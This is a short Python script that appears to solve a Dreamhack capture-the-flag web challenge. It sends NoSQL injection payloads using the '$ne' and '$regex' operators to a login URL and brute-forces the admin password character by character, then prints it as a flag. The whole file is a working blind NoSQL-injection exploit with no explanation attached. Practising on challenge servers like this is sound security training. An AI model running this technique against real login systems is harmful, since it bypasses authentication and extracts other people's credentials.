import requests
import string
 
url = "http://host1.dreamhack.games:11990/login"
s = string.digits + string.ascii_lowercase + string.ascii_uppercase + "{}"

result = ""
for j in range(0,32):
    for i in range(0, len(s)):
        payload = "?uid[$ne]=guest&uid[$ne]=dreamhack&upw[$regex]={" + (result+s[i])
        res = requests.get(url+payload)
        
        if res.text.find("admin") != -1:
            result += s[i]
            print(result)
            break
 
print("DH{" + result +"}")
